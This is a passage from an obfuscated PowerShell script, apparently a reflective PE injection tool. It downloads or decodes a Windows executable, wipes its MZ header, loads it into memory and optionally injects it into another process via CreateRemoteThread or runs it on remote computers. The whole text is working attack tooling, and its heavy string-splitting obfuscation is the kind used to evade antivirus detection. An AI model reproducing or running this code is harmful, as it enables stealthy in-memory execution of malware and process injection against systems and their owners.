                    &("{1}{0}{3}{4}{2}"-f 'i','Wr','arning','t','e-W') ('Er'+'r'+'or '+'ge'+'tting '+'DLL'+' '+'ha'+'ndl'+'e '+'i'+'n '+'Memory'+'F'+'reeL'+'ibrar'+'y'+', '+'DLL'+'Nam'+'e: '+"$ImportDllPath. "+'C'+'ont'+'inuing '+'an'+'y'+'ways') -WarningAction ("{0}{2}{1}"-f'C','ue','ontin')
                }
                
                ${SuCc`E`Ss} = ${Wi`N`3`2F`UNctions}."F`ReeL`ibr`ARY"."invo`ke"(${imp`o`RtDllH`AN`DLE})
                if (${S`UCCEsS} -eq ${FAl`sE})
                {
                    &("{0}{1}{2}{3}" -f'W','r','ite','-Warning') ('Una'+'ble '+'to'+' '+'free'+' '+'libra'+'ry'+': '+"$ImportDllPath. "+'Co'+'ntinu'+'i'+'ng '+'any'+'ways'+'.') -WarningAction ("{0}{1}{2}"-f'C','on','tinue')
                }
                
                ${i`MpOR`TDesC`RiPtORpTR} = &("{6}{2}{0}{1}{4}{3}{5}"-f'dI','n','ne','U','tAs','nsigned','Add-Sig') (${IMP`OrtDeSCrip`T`or`ptr}) (  $zNDo::"SI`Z`EOF"([Type]${wiN`32`Ty`pES}."imAG`e`_iMpORT_DeSCri`pT`Or"))
            }
        }
        
        
        &("{2}{0}{1}{3}" -f 'r','it','W','e-Verbose') ("{7}{14}{2}{5}{12}{4}{6}{13}{11}{0}{1}{8}{3}{10}{9}"-f 's ','bein','m','n','L','ai',' kn','Ca','g u','oaded','l','t i','n so the DL','ows i','lling dll')
        ${D`Ll`MaInPTR} = &("{0}{2}{3}{1}" -f 'Add-Si','gned','gnedI','ntAsUnsi') (${pe`I`Nfo}."P`Eha`NdLE") (${P`E`iNFo}."Im`A`gE_NT`_hEADe`RS"."o`pTi`on`ALhe`AdER"."AD`DREs`sOfEN`TRYpOInT")
        ${DL`lm`Ai`NDe`LegATE} = &("{0}{4}{1}{5}{2}{3}" -f 'Get','a','e','Type','-Deleg','t') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        ${dL`lmAiN} =  $zNdo::("{5}{1}{6}{0}{2}{7}{3}{4}" -f'gateForFunct','D','i','nPo','inter','Get','ele','o').Invoke(${DLlm`AIN`p`TR}, ${dLLM`AIN`DELeGA`TE})
        
        ${Dl`L`MAIn}."iN`Vo`KE"(${pei`N`Fo}."P`eHA`NDlE", 0,  (  DiR  ("V"+"Ari"+"ABle:pE"+"Fz6J") ).vAlue::"ze`RO") | &("{2}{1}{0}"-f'l','ul','Out-N')
        
        
        ${s`U`CCESs} = ${wIn`3`2FUNctI`OnS}."viRT`UAlf`Ree"."I`Nv`OKe"(${PE`hANDlE}, [UInt64]0, ${WiN`32c`Ons`T`AntS}."mEm_r`e`Lease")
        if (${SU`CcE`SS} -eq ${fA`lSe})
        {
            &("{0}{1}{2}{4}{3}"-f 'Wr','i','te-','rning','Wa') ((("{3}{16}{1}{14}{13}{7}{2}{5}{20}{10}{11}{8}{6}{4}{17}{15}{19}{18}{12}{9}{0}"-f'ng anyways.','able t','ua','U','6Sjs me','l','PE','rt','e ','nui','e',' on th','ti','Vi','o call ','r','n','mo','Con','y. ','Fre'))-cREplAcE  '6Sj',[ChaR]39) -WarningAction ("{1}{0}"-f 'inue','Cont')
        }
    }


    Function mA`in
    {
        ${wIn3`2F`U`Nct`iOnS} = &("{3}{0}{2}{1}"-f 'Wi','ns','n32Functio','Get-')
        ${WIN32T`y`PES} = &("{1}{2}{0}" -f 'es','Ge','t-Win32Typ')
        ${wi`N32`CoNSTAn`TS} =  &("{2}{0}{1}{3}"-f 'in32C','onstant','Get-W','s')
        
        ${R`EMOt`EPrOc`H`AnDLe} =   (VARiABlE PEFZ6j  ).VAlUe::"Z`eRO"
    
        
        if ((${Pr`ocID} -ne ${N`ULl}) -and (${pRoC`iD} -ne 0) -and (${pROcnA`ME} -ne ${nU`Ll}) -and (${p`ROc`Name} -ne ""))
        {
            Throw ((("{0}{9}{8}{5}{1}{4}{11}{14}{3}{10}{2}{7}{6}{13}{15}{12}"-f 'Ca','pl','ose ','Name,','y a Pr','sup','r the o','one o','{0}t ','n',' cho','ocI','r','th','d and Proc','e')) -f  [char]39)
        }
        elseif (${P`RocnAme} -ne ${n`ULl} -and ${pr`O`c`NamE} -ne "")
        {
            ${PRoc`ES`s`es} = @(&("{3}{1}{2}{0}" -f'ss','-Pr','oce','Get') -Name ${procn`AMe} -ErrorAction ("{3}{2}{1}{0}{4}" -f 'u','n','lyConti','Silent','e'))
            if (${pRo`C`es`Ses}."c`OuNt" -eq 0)
            {
                Throw ((('C'+'anl0nt ') -CRePlaCE ([cHaR]108+[cHaR]48+[cHaR]110),[cHaR]39)+'fin'+'d '+'pr'+'o'+'cess '+"$ProcName")
            }
            elseif (${PROcE`s`sES}."COU`NT" -gt 1)
            {
                ${PRo`CI`Nfo} = &("{0}{2}{1}"-f'G','Process','et-') | &("{0}{1}"-f 'whe','re') { ${_}."na`me" -eq ${pR`O`Cname} } | &("{3}{0}{1}{2}" -f'lect-Obj','ec','t','Se') ("{2}{0}{1}" -f'o','cessName','Pr'), ('Id'), ("{1}{2}{0}" -f 'd','Session','I')
                &("{0}{2}{1}"-f'Wr','utput','ite-O') ${P`R`ociNfo}
                Throw ('Mo'+'re '+'th'+'an '+'one'+' '+'in'+'stance '+'o'+'f '+"$ProcName "+'fo'+'un'+'d, '+'please'+' '+'sp'+'ecif'+'y '+'th'+'e '+'pro'+'c'+'ess '+'ID'+' '+'t'+'o '+'i'+'nject '+'in'+' '+'to'+'.')
            }
            else
            {
                ${P`ROCId} = ${PR`Oces`s`ES}[0]."i`d"
            }
        }
        
        
        





        
        if ((${Pr`o`Cid} -ne ${n`Ull}) -and (${p`ROcID} -ne 0))
        {
            ${rEMOTEprO`cH`AnD`le} = ${win`32`F`UnctIoNS}."OPEn`pRoC`esS"."Inv`oKE"(0x001F0FFF, ${fA`Lse}, ${pR`o`cId})
            if (${REMO`TepRO`CHan`dLE} -eq   $pEFZ6J::"z`erO")
            {
                Throw ((('Co'+'uldn'+'OF'+'it ') -RepLaCe  'OFi',[chAr]39)+'obt'+'ain '+'th'+'e '+'ha'+'nd'+'le '+'fo'+'r '+'pr'+'ocess'+' '+'ID:'+' '+"$ProcId")
            }
            
            &("{1}{0}{2}" -f 'r','Write-Ve','bose') ("{9}{10}{12}{1}{14}{2}{15}{5}{11}{7}{4}{3}{6}{13}{0}{8}" -f 'in','dle f',' t','n','i','e remote proc','je','ss to ',' to','G','ot t','e','he han','ct ','or','h')
        }
        

        
        &("{1}{2}{0}{3}"-f'bo','Write-V','er','se') ("{8}{1}{7}{5}{0}{6}{2}{4}{9}{3}"-f 'vok','al','L','ry','oa','n','e-Memory','ling I','C','dLibra')
        ${pEh`ANd`LE} =  $Pefz6j::"zE`RO"
        if (${RE`MOte`pr`O`ChANdLE} -eq   $pefZ6J::"ZE`Ro")
        {
            ${Pe`lo`AD`E`dInfO} = &("{6}{0}{2}{3}{4}{5}{1}"-f'nvok','oadLibrary','e-','M','e','moryL','I') -PEBytes ${pe`B`YtES} -ExeArgs ${eX`E`ARgs} -ForceASLR ${FO`R`cEAsLR}
        }
        else
        {
            ${p`E`lOaDEdIn`Fo} = &("{1}{0}{4}{3}{5}{2}"-f 'v','In','ibrary','o','oke-Mem','ryLoadL') -PEBytes ${p`eByt`ES} -ExeArgs ${ExEAr`gs} -RemoteProcHandle ${re`MOtEPRO`c`HAnd`LE} -ForceASLR ${f`OrC`eASlr}
        }
        if (${pElOa`d`EdI`NFO} -eq   (gI  VArIabLe:PefZ6J ).ValUE::"ze`Ro")
        {
            Throw ("{6}{12}{10}{1}{8}{9}{0}{11}{7}{5}{4}{2}{3}" -f'andl','o','NU','LL',' ','d is','U','turne',' load PE, ','h',' t','e re','nable')
        }
        
        ${PEH`A`NdLE} = ${pEL`oa`DeDin`Fo}[0]
        ${r`emotepE`H`A`NDLe} = ${PE`Load`ediN`Fo}[1] 
        
        
        
        ${pE`InfO} = &("{3}{1}{2}{4}{0}"-f 'o','ta','iled','Get-PEDe','Inf') -PEHandle ${Pe`hanDle} -Win32Types ${w`IN`32tyP`Es} -Win32Constants ${wiN32`CoNst`A`Nts}
        if ((${p`eI`Nfo}."fi`LeT`YpE" -ieq "DLL") -and (${R`e`mOTe`pRoC`hANdLE} -eq  (  GI vARIAble:PEfz6J).vALuE::"zE`Ro"))
        {
            
            
            
            switch (${Fu`NcrEtU`R`NtY`PE})
            {
                ("{0}{1}" -f'WS','tring') {
                    &("{2}{0}{1}" -f 'Verb','ose','Write-') ("{5}{2}{4}{7}{6}{1}{0}{3}"-f 'rn ','etu','alling functi','type','on with W','C','g r','Strin')
                    [IntPtr]${W`strI`NgfuNC`A`ddR} = &("{4}{1}{5}{3}{0}{2}" -f 'oryProcAddre','t','ss','em','Ge','-M') -PEHandle ${pe`h`ANdle} -FunctionName ("{0}{1}{3}{2}"-f'W','S','gFunc','trin')
                    if (${WsTRingF`U`NC`AD`DR} -eq  (ItEm  ('VARi'+'AblE:'+'p'+'ef'+'Z6J')).VALue::"z`ero")
                    {
                        Throw ((("{2}{3}{0}{9}{1}{4}{6}{7}{8}{5}" -f '6','cti','C','ouldn2','on','ress.',' a','d','d','0t find fun'))."r`EPLACe"(([CHAr]50+[CHAr]54+[CHAr]48),[StRING][CHAr]39))
                    }
                    ${WStRIngf`UNc`DelegA`TE} = &("{1}{3}{0}{4}{2}"-f 't-D','G','legateType','e','e') @() ([IntPtr])
                    ${w`sTRing`F`UNc} =   (vARIAblE  zNDo).VALue::("{0}{2}{3}{4}{1}{6}{5}" -f 'Ge','teForFu','t','Dele','ga','tionPointer','nc').Invoke(${w`STri`NGFUnCADDr}, ${w`ST`Ring`FUnCdeLega`TE})
                    [IntPtr]${O`U`T`PuTpTR} = ${Ws`TRiN`G`Func}."inV`oKE"()
                    ${O`Ut`PuT} =   $ZNDO::("{4}{3}{1}{0}{2}" -f'Un','ing','i','ToStr','Ptr').Invoke(${o`UtpuT`pTr})
                    &("{0}{2}{1}" -f 'Wr','-Output','ite') ${O`UTput}
                }

                ("{1}{0}"-f 'ring','St') {
                    &("{0}{2}{1}" -f'Wri','Verbose','te-') ("{1}{9}{2}{3}{6}{7}{8}{4}{0}{5}"-f 'n','Ca','ng ','fu','ring retur',' type','nction wi','th S','t','lli')
                    [IntPtr]${sTrI`N`G`FuNCAD`dR} = &("{0}{1}{4}{2}{3}{5}{6}"-f 'Get-Me','m','Pro','c','ory','Addres','s') -PEHandle ${p`EhA`ND`le} -FunctionName ("{1}{0}{3}{2}"-f 'tr','S','c','ingFun')
                    if (${Str`i`NGFU`NCAD`dr} -eq   $peFZ6j::"Z`erO")
                    {
                        Throw ((("{2}{1}{5}{0}{3}{4}" -f 'o','{0}t find fun','Couldn','n addres','s.','cti')) -f [chAR]39)
                    }
                    ${sTri`NGFun`cDE`l`e`gatE} = &("{3}{0}{4}{2}{1}"-f 'at','e','yp','Get-Deleg','eT') @() ([IntPtr])
                    ${STri`N`gfunC} =   (lS ('vArIa'+'B'+'le:zn'+'DO')  ).vALuE::("{4}{0}{3}{2}{1}"-f'lega','ctionPointer','un','teForF','GetDe').Invoke(${Str`ingFU`N`CA`ddr}, ${StrIN`gf`UnC`d`ELeg`AtE})
                    [IntPtr]${OuT`pu`TP`Tr} = ${sTRiN`G`F`UNc}."INVo`KE"()
                    ${o`UtpUT} =  (VaRiablE znDO  -va)::("{2}{1}{3}{0}"-f 'oStringAnsi','tr','P','T').Invoke(${oU`TPUt`p`Tr})
                    &("{0}{1}{3}{2}" -f'W','ri','-Output','te') ${O`U`Tput}
                }

                ("{0}{1}" -f 'Vo','id') {
                    &("{2}{0}{3}{1}"-f 'i','se','Wr','te-Verbo') ("{10}{1}{3}{5}{4}{0}{7}{9}{2}{8}{6}" -f 'wit','lling ','tur','functi',' ','on','e','h V','n typ','oid re','Ca')
                    [IntPtr]${VO`id`FunCA`DdR} = &("{0}{3}{4}{2}{5}{1}"-f'Get','ss','yP','-Memo','r','rocAddre') -PEHandle ${PeHA`N`DLe} -FunctionName ("{1}{0}"-f'nc','VoidFu')
                    if (${V`OiDfU`Nc`Ad`Dr} -eq  (  VarIABLe  peFz6j ).vAlue::"ZE`RO")
                    {
                        Throw ((("{3}{0}{4}{6}{1}{5}{2}"-f 'ouldnPaR','tion ','ddress.','C','t ','a','find func'))-crepLacE([CHAR]80+[CHAR]97+[CHAR]82),[CHAR]39)
                    }
                    ${v`oiDF`UNCdELeG`AtE} = &("{0}{2}{4}{1}{3}" -f 'Ge','e','t-D','Type','elegat') @() ([Void])
                    ${V`oidFuNC} =   $zNdO::("{2}{1}{0}{4}{5}{6}{7}{3}"-f 'leg','tDe','Ge','inter','ateFo','rFunc','t','ionPo').Invoke(${vOiD`F`UncAdDR}, ${vo`I`DFuNCDEL`egaTE})
                    ${Vo`Id`FUnc}."INv`o`KE"() | &("{1}{2}{0}" -f '-Null','O','ut')
                }
            }
            
            
            
        }
        
        elseif ((${pe`in`Fo}."FiL`ET`yPe" -ieq "DLL") -and (${rEMoT`epROCh`AnD`LE} -ne  (  GeT-VarIAblE pEfZ6j  -VALuEo  )::"ZE`RO"))
        {
            ${Voi`dfun`C`A`DDr} = &("{2}{1}{0}{3}{4}"-f 'roc','-MemoryP','Get','Addres','s') -PEHandle ${p`ehaNd`Le} -FunctionName ("{1}{0}{2}" -f 'Fun','Void','c')
            if ((${VoI`dfUnc`A`dDr} -eq ${N`UlL}) -or (${vO`Id`FUncaD`Dr} -eq   $PEFz6J::"Z`ERo"))
            {
                Throw ((("{1}{2}{3}{4}{6}{5}{7}{0}{8}"-f 'h','VoidFunc',' ','cou','ldnC','t ','Q4','be found in t','e DLL')) -REpLacE  'CQ4',[cHaR]39)
            }
            
            ${Vo`Idfu`NCa`ddR} = &("{2}{5}{1}{0}{4}{3}"-f 'nedI','Sig','Su','Unsigned','ntAs','b-') ${v`oIdf`U`N`CAddr} ${p`EhAND`le}
            ${vOiD`FUNCAd`dr} = &("{2}{4}{1}{0}{3}" -f 's','ntA','Add-S','Unsigned','ignedI') ${vOIdf`UnC`AdDR} ${rEmOte`peH`AndlE}
            
            
            ${R`THRE`ADhan`dle} = &("{4}{3}{0}{1}{2}"-f 'Rem','oteThre','ad','te-','Crea') -ProcessHandle ${RemO`TEpR`OCHAN`D`LE} -StartAddress ${void`F`UnC`AdDr} -Win32Functions ${wIn`32FUn`ct`i`onS}
        }
        
        
        
        if (${re`M`OtEPrOcH`A`NdLe} -eq  ( vAriABLE  pEFz6J  ).vaLuE::"zE`Ro" -and ${pe`iNfo}."f`ILET`yPE" -ieq "DLL")
        {
            &("{4}{3}{0}{2}{5}{1}"-f'oke-Me','y','moryFreeLi','nv','I','brar') -PEHandle ${PE`han`dlE}
        }
        else
        {
            
            ${sUcC`E`SS} = ${Wi`N32FUNC`TiO`NS}."VIRt`UA`lfRee"."INv`oKe"(${P`EHAndLE}, [UInt64]0, ${W`iN3`2`cONsTAnTS}."Mem_rel`E`A`sE")
            if (${sU`CceSS} -eq ${Fa`LsE})
            {
                &("{2}{1}{0}{3}" -f 'W','ite-','Wr','arning') ((("{11}{6}{16}{12}{0}{3}{1}{8}{5}{15}{14}{10}{2}{7}{9}{13}{4}" -f'o',' VirtualFree on the ','C',' call','ys.','0','n','ontinuing an','PE{','y','emory. ','U','e t','wa',' m','}s','abl'))-F  [ChAr]39) -WarningAction ("{2}{0}{1}" -f 'inu','e','Cont')
            }
        }
        
        &("{0}{3}{4}{2}{1}" -f'Wri','e','os','te-V','erb') ("{0}{1}" -f'Don','e!')
    }

    &("{1}{0}" -f 'in','Ma')
}


Function ma`In
{
    if ((${psC`MD`leT}."MYI`Nvo`C`ATion"."bOUndPar`AM`ET`E`RS"[("{0}{1}" -f 'De','bug')] -ne ${NU`Ll}) -and ${p`ScmdL`Et}."m`YinVOCa`TI`ON"."B`ouNDpa`RaME`TErs"[("{1}{0}" -f 'ebug','D')]."iSpr`e`sENT")
    {
        ${DeBugp`R`EF`erEnCE}  = ("{1}{0}" -f 'e','Continu')
    }
    
    &("{1}{0}{3}{2}" -f'e-Ver','Writ','ose','b') ('Power'+'Shel'+'l '+'Process'+'ID'+': '+"$PID")
    
    if (${pSCMD`leT}.pARamEtErsETNAMe -ieq ("{1}{0}{2}" -f 'a','Loc','lFile'))
    {
        &("{3}{0}{2}{1}" -f'd','tem','I','Get-Chil') ${Pe`pA`TH} -ErrorAction ("{0}{1}" -f 'Sto','p') | &("{1}{0}" -f 'll','Out-Nu')
        [Byte[]]${pe`ByTEs} =  (  VaRiAbLe  39r8h  ).valUE::("{1}{2}{0}{3}" -f 'dAllBy','R','ea','tes').Invoke((&("{0}{1}{2}" -f 'Resolv','e-P','ath') ${Pep`A`Th}))
    }
    elseif (${p`SCmd`l`et}.PaRameTerSETnAmE -ieq ("{1}{0}" -f 'e','WebFil'))
    {
        ${wEbclI`E`NT} = &("{1}{2}{0}" -f'ect','New-Ob','j') ("{3}{0}{5}{1}{2}{4}" -f 'ystem.','t','.WebCli','S','ent','Ne')
        
        [Byte[]]${Pe`By`Tes} = ${weB`cl`iENT}.("{1}{0}{2}" -f'at','DownloadD','a').Invoke(${Pe`U`RL})
    }
    else{
        [Byte[]]${PebYt`ES} = [Byte[]] $Mf341::("{1}{4}{3}{0}{2}"-f'e64Str','Fr','ing','Bas','om').Invoke(${p`EBA`SE64})
    }
    
    
    ${E_M`A`Gic} = (${P`EBYT`eS}[0..1] | &('%') {[Char] ${_}}) -join ''

    if (${e_Ma`GIC} -ne 'MZ')
    {
        throw ("{5}{6}{4}{0}{2}{1}{3}"-f'id PE ','i','f','le.','l','PE ','is not a va')
    }

    
    
    ${P`e`BYtEs}[0] = 0
    ${Pe`By`TeS}[1] = 0
    
    
    if (${Ex`E`ARGS} -ne ${N`UlL} -and ${EX`ea`Rgs} -ne '')
    {
        ${e`XEAR`gS} = ('Re'+'flec'+'tiveExe'+' '+"$ExeArgs")
    }
    else
    {
        ${e`xeaR`GS} = ("{3}{0}{1}{2}{4}"-f'flect','i','ve','Re','Exe')
    }

    if (${C`oMPU`TErnAmE} -eq ${n`ULL} -or ${c`ompuTe`R`NAme} -imatch "^\s*$")
    {
        &("{3}{2}{4}{0}{1}" -f'ke-C','ommand','nv','I','o') -ScriptBlock ${R`emoteS`Cr`ip`TbLOck} -ArgumentList @(${peB`YT`Es}, ${fUnCR`ETu`R`NTy`PE}, ${pRoc`id}, ${PrOc`Na`me},${Forcea`S`LR})
    }
    else
    {
        &("{2}{1}{0}"-f'd','e-Comman','Invok') -ScriptBlock ${re`moT`eScrIPTbL`OCK} -ArgumentList @(${peB`yt`eS}, ${fuNCretU`R`NT`YPE}, ${pR`Oc`Id}, ${PRoCn`A`Me},${f`oRceA`slR}) -ComputerName ${C`o`mPUt`ErnAmE}
    }
}

&("{0}{1}"-f 'Ma','in')
}